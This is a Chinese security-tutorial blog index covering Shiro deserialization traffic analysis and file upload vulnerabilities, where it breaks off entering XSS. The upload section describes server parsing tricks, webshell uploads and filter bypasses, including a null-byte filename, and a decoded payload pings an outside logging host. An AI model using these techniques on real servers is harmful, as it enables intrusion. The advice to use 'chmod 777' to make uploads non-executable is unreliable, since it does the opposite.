src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617546428191-efe0ddad-f0af-4a22-adb1-7c36b19ad9f3.png#height=148&id=l1M5t&originHeight=166&originWidth=302&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6652&status=done&style=none&title=&width=270" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617546428191-efe0ddad-f0af-4a22-adb1-7c36b19ad9f3.png#height=148&id=l1M5t&originHeight=166&originWidth=302&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6652&status=done&style=none&title=&width=270" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />命令执行成功</p><p><a name="a2ZKb"></a></p><h1 id="Shiro-反序列化漏洞的流量特征"><a href="#Shiro-反序列化漏洞的流量特征" class="headerlink" title="Shiro 反序列化漏洞的流量特征"></a>Shiro 反序列化漏洞的流量特征</h1><ul><li>payload 是构造 Cookie 的 RememberMe 的值</li><li>RememberMe 的值经过了 AES 加密、Base64 编码</li><li>请求包中 RememberMe 的值通常为 512 字节，攻击者构造的 payload 的值一般远高于 512 字节<br><a name="okKtN"></a></li></ul><h3 id="实例：-7"><a href="#实例：-7" class="headerlink" title="实例："></a>实例：</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617548080333-9c0fd901-f1ac-4221-ab6f-6a4befc79eab.png#height=574&id=Ub1sN&originHeight=791&originWidth=855&originalType=binary&ratio=1&rotation=0&showTitle=false&size=156057&status=done&style=none&title=&width=620" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617548080333-9c0fd901-f1ac-4221-ab6f-6a4befc79eab.png#height=574&id=Ub1sN&originHeight=791&originWidth=855&originalType=binary&ratio=1&rotation=0&showTitle=false&size=156057&status=done&style=none&title=&width=620" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />将 RememberMe 的内容通过 Shiro RememberMe 在线解密的网站进行解密操作：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617548589906-449d2610-d583-4d7c-aaa3-008cf8187ccf.png#height=984&id=Y9YbE&originHeight=984&originWidth=1801&originalType=binary&ratio=1&rotation=0&showTitle=false&size=237089&status=done&style=none&title=&width=1801" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12901471/1617548589906-449d2610-d583-4d7c-aaa3-008cf8187ccf.png#height=984&id=Y9YbE&originHeight=984&originWidth=1801&originalType=binary&ratio=1&rotation=0&showTitle=false&size=237089&status=done&style=none&title=&width=1801" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />分析解密后的数据可以看到应该为 Runtime.getRuntime().exec()这类函数执行了 ping 命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java/lang/Runtime* getRuntime()Ljava/lang/Runtime;,- +.ping shiro.l3jj9e.ceye.io0exec<span class="string">&#x27;(Ljava/lang/String;)Ljava/lang/Process;</span></span><br></pre></td></tr></table></figure><p>可以判断遭受到了 Shiro 反序列漏洞的攻击</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="/2023/06/29/frontend/security/wen-jian-shang-chuan-lou-dong/"/>
      <url>/2023/06/29/frontend/security/wen-jian-shang-chuan-lou-dong/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="097f3733"></a></p><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p><a name="e05dce83"></a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令（webshell）的能力。文件上传在互联网应用中是很正常的需求，问题不是出现在需求上，而是在文件上传服务器后服务器如何处理、解析该文件，若服务器处理不恰当，则可能会造成比较严重的问题。</p><p>文件上传后导致的常见安全问题一般有：</p><ul><li>上传文件是 Web 脚本语言，服务器的 Web 容器解释并执行了用户上传的脚本，导致代码执行；</li><li>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行；</li><li>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。</li></ul><p><a name="3da97426"></a></p><h3 id="经典例子"><a href="#经典例子" class="headerlink" title="经典例子"></a>经典例子</h3><p><a name="23e9a7f5"></a></p><h4 id="Apache-文件解析问题"><a href="#Apache-文件解析问题" class="headerlink" title="Apache 文件解析问题"></a>Apache 文件解析问题</h4><p>在 Apache 1.x、部分 2.x 中，对文件名的解析存在以下特性：Apache 对于文件名的解析是从后往前解析的，直到遇见一个 Apache 认识的文件类型为止。比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件： PhpShell.php.rar.rar.rar <span class="comment">// 上传至指定服务器根目录</span></span><br><span class="line"></span><br><span class="line">  内容如下:</span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">phpinfo</span>(); <span class="comment">// 会输出php的描述信息</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为 Apache 并不认识 rar 这个文件类型，所以会一直遍历到 php 后缀，然后认为这是一个 PHP 类型的文件。也就是说，当访问该资源时候，Apache 将会将其当成 php 文件执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/PhpShell.php.rar.rar.rar</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png#id=E7FN0&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png#id=E7FN0&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>那么如何知道 Apache 认识哪些文件类型？通过 Apache 根目录下 conf 文件夹的 mime.types 文件便可以知道。</p><p><img src="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2.png#id=JSfp8&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2.png#id=JSfp8&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>针对这种情况，在 apache conf&#x2F;httpd.conf 文件中增加如下配置来禁止<code>.php. .php3. .php4.</code>等等这样的文件执行：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Files</span> ~ &quot;<span class="attr">.</span>+<span class="attr">.ph</span>(<span class="attr">p</span>[<span class="attr">3457</span>]?|<span class="attr">t</span>|<span class="attr">tml</span>)<span class="attr">.</span>&quot;&gt;</span></span><br><span class="line">        Order Allow,Deny</span><br><span class="line">        Deny from al</span><br><span class="line"><span class="tag">&lt;/<span class="name">Files</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="2e66db4b"></a></p><h3 id="IIS-文件解析问题"><a href="#IIS-文件解析问题" class="headerlink" title="IIS 文件解析问题"></a>IIS 文件解析问题</h3><p>IIS 6 存在这样一个漏洞：当文件名为 test.asp;xx.jpg 时，IIS 将会将其当成 test.asp 文件进行解析，<code>;</code>及其后面的 xx.jpg 被忽略，简单地说，文件名被截断了。</p><p>当服务器中存在 test.asp;123.jpg 的图片文件时，客户端通过如下 url 查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.asp;123.jpg</span><br></pre></td></tr></table></figure><p>正常情况下应该是返回一张图片，但由于 IIS 6 上面的这个特性（微软官方不承认这是个 bug），<code>;</code>及其后面的 123.jpg 被截去了，导致 IIS 6 直接将其当作.asp 文件来解析，从而造成了安全问题。比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">文件： now.asp;123.jpg</span><br><span class="line"></span><br><span class="line">内容如下:</span><br><span class="line">&lt;%=NOW()%&gt; // asp获取当前时间函数，类似这种的图片称为图片木马</span><br></pre></td></tr></table></figure><p>发起请求访问该文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8181/now.asp;123.jpg</span><br></pre></td></tr></table></figure><p>返回结果：</p><p><img src="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/3.png#id=hrUiv&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/3.png#id=hrUiv&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>除了上面这个漏洞外，IIS 6 还有个更加严重的问题。当服务器中建立如*.asa、*.asp 的文件夹时，其下的所有文件都会被当作 asp 脚本执行。如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">文件： parsing.asp/now.jpg</span><br><span class="line"></span><br><span class="line">内容如下:</span><br><span class="line">&lt;%=NOW()%&gt; // asp获取当前时间函数</span><br></pre></td></tr></table></figure><p>发起请求访问该文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8181/parsing.asp/now.jpg</span><br></pre></td></tr></table></figure><p>返回结果：</p><p><img src="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/4.png#id=GsgTR&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/4.png#id=GsgTR&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>不过，上述两个漏洞需要该文件确实存在于服务器本地存储中，若只是映射出来的 URL，是无法触发 bug 的。</p><p><a name="WebDav"></a></p><h4 id="WebDav"><a href="#WebDav" class="headerlink" title="WebDav"></a>WebDav</h4><p>WebDav 大大扩展了 HTTP 协议中 GET、POST、HEAD 等功能，它所包含的 PUT 方法，允许用户上传文件到指定的路径下。但除了 PUT，它还支持 MOVE、COPY 等方法对服务器文件进行修改，这样就产生了如下的文本漏洞：通过 PUT 上传文件至指定路径，在结合 MOVE&#x2F;COPY 方法修改该文件为脚本文件。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">文件名: 123.jpg // 通过PUT方法上传</span><br><span class="line"></span><br><span class="line">内容如下:</span><br><span class="line">&lt;%=NOW()%&gt; // asp获取当前时间函数</span><br><span class="line"></span><br><span class="line">// MOVE或COPY方法改名</span><br><span class="line">COPY 123.JPG HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8181</span><br><span class="line">Destination: http:127.0.0.1:8181/123.asp</span><br></pre></td></tr></table></figure><p>然后再通过<code>http:127.0.0.1:8181/123.asp</code>访问，成功获取 webshell 执行脚本。此外，DELETE 方法的开启也可能导致文件被恶意删除，所以使用 WebDav 时需要多加注意。</p><p><a name="7b6257f4"></a></p><h4 id="PHP-CGI-解析漏洞"><a href="#PHP-CGI-解析漏洞" class="headerlink" title="PHP CGI 解析漏洞"></a>PHP CGI 解析漏洞</h4><p>2010 年 5 月，国内的安全组织 80sec 发布了一个 Nginx 的漏洞，指出在 Nginx 配置 fastcgi 使用 PHP 时，会存在文件类型解析问题：当请求 url 为<code>http://www.test.com/1.jpg/1.php</code>且 1.php 不存在但 1.jpg 存在时，会把 1.jpg 当作 php 类型文件进行解析执行。这就意味着攻击者可以上传合法的“图片木马”，然后在访问该”图片木马“时在 url 末尾加上“&#x2F;*.php”），即可获得 webshell。</p><p><img src="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/5.png#id=MUmLB&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/5.png#id=MUmLB&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>后来经人们深入研究发现，产生漏洞的根本原因并不是 Nginx，而是因为某些版本的 PHP CGI。在 PHP 的配置文件中有一个关键选项：cig.fi: x_pathinfo，这个选项在某些版本中是默认开启的，在开启时访问 URL，比如<code>http://www.test.com/1.jpg/1.php</code>，1.php 是不存在的文件，PHP 将会往前递归解析，于是造成了解析漏洞。这个往前递归的功能原本是想解决<code>http://www.test.com/1.php/test</code>这种 URL，能够正确地解析到 1.php 上。所以，在其他使用了该版本 PHP CGI 的 Web 容器中也存在上述漏洞，例如 IIS 7、IIS 7.5。</p><p>有人向 PHP 官方提供了第三方补丁试想修补这个 bug，但是官方不认为这是一个 bug，拒绝修改。官方给出的建议是将上述选项关闭，但是可想而知，对于不知情者仍然存在遭受损失的风险。</p><p><a name="7f550b01"></a></p><h3 id="绕过检查的-N-种手段"><a href="#绕过检查的-N-种手段" class="headerlink" title="绕过检查的 N 种手段"></a>绕过检查的 N 种手段</h3><p>常见的防御手段是进行文件类型检查，但由于疏忽或者检查不到位，容易被攻击者绕过。</p><p><a name="64949226"></a></p><h4 id="单独地前端限制文件类型"><a href="#单独地前端限制文件类型" class="headerlink" title="单独地前端限制文件类型"></a>单独地前端限制文件类型</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> filename = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> str = filename.<span class="property">value</span>.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> ext = str[str.<span class="property">length</span> - <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> (ext == <span class="string">&quot;jpg&quot;</span> || ext == <span class="string">&quot;png&quot;</span> || ext == <span class="string">&quot;jpeg&quot;</span> || ext == <span class="string">&quot;gif&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;这不是图片！&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仅通过表单上传前进行文件格式检查是否是图片，这显现是不可靠的。对于专业的黑客来说有 N 种手法绕过。</p><ul><li>正常上传图片格式，使用 BurpSuite 或其他工具截取数据包，并将数据包中文件扩展名更改回原来的，达到绕过的目的。例如正常上传 PHP 图片木马 1.jpg，截取数据包后将其改正为 1.php，然后通过 url 正常访问。</li><li>直接通过开发者工具移除该事件函数。</li><li>浏览器直接设置禁用 JavaScript。</li></ul><p>这里使用的是白名单策略，相对来说并没有太多缺陷，但如果是使用黑名单策略问题就大了：通过.htaccess 规则文件绕过、通过文件后缀大小写绕过等等。</p><p>解释：.htaccess 文件(或者”分布式配置文件”）,全称是 Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。概述来说，.htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能，若安全检查通过黑名单策略进行，遗漏了此类型的文件时，攻击者就可以利用.htaccess 文件改变 web 容器的配置，制造破坏。</p><p><a name="3ade7772"></a></p><h4 id="单独地后端限制文件类型"><a href="#单独地后端限制文件类型" class="headerlink" title="单独地后端限制文件类型"></a>单独地后端限制文件类型</h4><p>这里只讨论白名单策略安全检查。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$postfix</span> = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])）;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$postfix</span>==<span class="string">&#x27;jpg&#x27;</span>||<span class="variable">$postfix</span>==<span class="string">&#x27;png&#x27;</span>||<span class="variable">$postfix</span>==<span class="string">&#x27;jpeg&#x27;</span>||<span class="variable">$postfix</span>==<span class="string">&#x27;gif&#x27;</span>)&#123;</span><br><span class="line">  <span class="comment">//save the file and do something next</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;invalid file type&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段 PHP 表示只允许接收保存 jpg、png、gif 三种图片格式，在 php&lt;5.3.4 的版本中，有这样一个 bug：在部分字符串处理函数中，0x00 被认为是终止符。假设上述代码拦截的请求中，filename 为 1.jpg%00.php，在 explode 中则可能会被当作 1.jpg 处理，然后得到的后缀就是 jpg 了，成功绕过检查，但存储的确实是 php 格式文件。</p><p><a name="68027d5b"></a></p><h3 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h3><p><a name="ab359d7f"></a></p><h4 id="文件上传的目录设置为不可执行"><a href="#文件上传的目录设置为不可执行" class="headerlink" title="文件上传的目录设置为不可执行"></a>文件上传的目录设置为不可执行</h4><p>只要 Web 容器无法解析该目录下的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此此点至关重要。在实际应用中，很多大型网站的上传应用，文件上传后会放到独立的存储上，做静态文件处理，一方面方便使用缓存加速，降低性能损耗；另一方面也杜绝了脚本执行的可能。</p><p>windows 可通过右键-&gt;属性打开下面面板进行修改文件夹权限：</p><p><img src="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/6.png#id=bajHn&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/6.png#id=bajHn&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>linux 则可以通过命令进行修改：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /use/www/WebSecurity</span><br></pre></td></tr></table></figure><p><a name="269dd001"></a></p><h4 id="判断文件类型"><a href="#判断文件类型" class="headerlink" title="判断文件类型"></a>判断文件类型</h4><p>判断文件类型也能在一定程度上避免上传漏洞，前后端双重校验效果最佳。</p><p>前端检验：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> filename = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> str = filename.<span class="property">value</span>.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> ext = str[str.<span class="property">length</span> - <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> (ext == <span class="string">&quot;jpg&quot;</span> || ext == <span class="string">&quot;png&quot;</span> || ext == <span class="string">&quot;jpeg&quot;</span> || ext == <span class="string">&quot;gif&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;这不是图片！&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后端检验(PHP)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$postfix</span> = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])）;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$postfix</span>==<span class="string">&#x27;jpg&#x27;</span>||<span class="variable">$postfix</span>==<span class="string">&#x27;png&#x27;</span>||<span class="variable">$postfix</span>==<span class="string">&#x27;jpeg&#x27;</span>||<span class="variable">$postfix</span>==<span class="string">&#x27;gif&#x27;</span>)&#123;</span><br><span class="line">  <span class="comment">//save the file and do something next</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;invalid file type&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前端在表单上传之前检查文件类型，若不符合则不允许提交。单靠表单检查类型是不安全的，因为前端的代码时完全暴露并且允许在开发者工具中进行修改，比如直接去掉这个事件绑定，对于专业人员来说完全起不了作用，所以需要结合后台进行类型限制。无论是后台还是前端，统一使用白名单策略，指定允许通过的文件类型，不在白名单外的全都视为非法类型不允许通过，相对黑名单策略更加安全，因为黑名单总有遗漏的文件类型。</p><p>此外，还可以检查 HTTP Header 中的 Content-Type，HTTP 协议规定了上传资源的时候在 Header 中加上一项文件的 MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型。不过这仍然是不安全的，因为 HTTP header 可以被发出者或者中间人任意的修改，不过聊胜于无。</p><p><a name="8f73d47b"></a></p><h4 id="使用随机数改写文件名和文件路径"><a href="#使用随机数改写文件名和文件路径" class="headerlink" title="使用随机数改写文件名和文件路径"></a>使用随机数改写文件名和文件路径</h4><p>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用使用随机数改写了文件名和路径，将极大地增加攻击的成本。与此同时，像 shell.php.rar.rar 这种文件，将因为文件名被改写而无法成功实施攻击。</p><p><a name="103207cb"></a></p><h4 id="单独设置文件服务器的域名"><a href="#单独设置文件服务器的域名" class="headerlink" title="单独设置文件服务器的域名"></a>单独设置文件服务器的域名</h4><p>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传包含 JavaScript 的 XSS 利用等问题将得到解决。但能否如此设置，还需要看具体的业务环境。</p><p><a name="25f9c7fa"></a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>文件上传是一个常见的业务需求，但因其与服务器直接交互，所带来的安全问题也是相对严重的，也是黑客的重点关注对象，为此需要安全人员做足充分的安全检查，才能保证服务器安全。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨站脚本攻击</title>
      <link href="/2023/06/29/frontend/security/kua-zhan-jiao-ben-gong-ji/"/>
      <url>/2023/06/29/frontend/security/kua-zhan-jiao-ben-gong-ji/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="1d4d889f"></a></p><h2 id="跨站脚本攻击"><a href="#跨站脚本攻击" class="headerlink" title="跨站脚本攻击"></a>跨站脚本攻击</h2><p><a name="1d4d889f-1"></a></p><h3 id="跨站脚本攻击-1"><a href="#跨站脚本攻击-1" class="headerlink" title="跨站脚本攻击"></a>跨站脚本攻击</h3><p>跨站脚本攻击（Cross-Site Scripting,XSS）是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。当被攻击者登录到存在恶意代码的网站时，恶意代码就会运行，通过攻击获取到用户的权限，从而恶意操作。</p><p>如果 WEB 应用没有做足安全验证，那么这些攻击就很容易成功，毕竟浏览器是无法自动判断代码或数据是否是恶意的。所以如果没有足够的安全措施，诸如 cookie、tokens 等用户识别信息将会有被窃取的危险，又或者用户在输入用户账号密码时，触发了窃取账号密码的恶意代码，从而被攻击者侵入。</p><p>一般情况下，在以下两种情况下容易被 XSS 攻击：</p><ul><li>数据从一个不可靠的链接进入到一个 Web 应用程序。</li><li>没有过滤掉恶意代码的动态内容被发送给 Web 用户。</li></ul><p>恶意内容一般包括 JavaScript，但是，有时候也会包括 HTML，FLASH 或是其他浏览器可执行的代码。XSS 攻击的形式千差万别，但他们通常都会：将 cookies 或其他隐私信息发送给攻击者，将受害者重定向到由攻击者控制的网页，或是经由恶意网站在受害者的机器上进行其他恶意操作。</p><p>XSS 攻击可以分为 3 类：存储型（持久型）、反射型（非持久型）、DOM 型。</p><ul><li><strong>存储型 XSS</strong><br 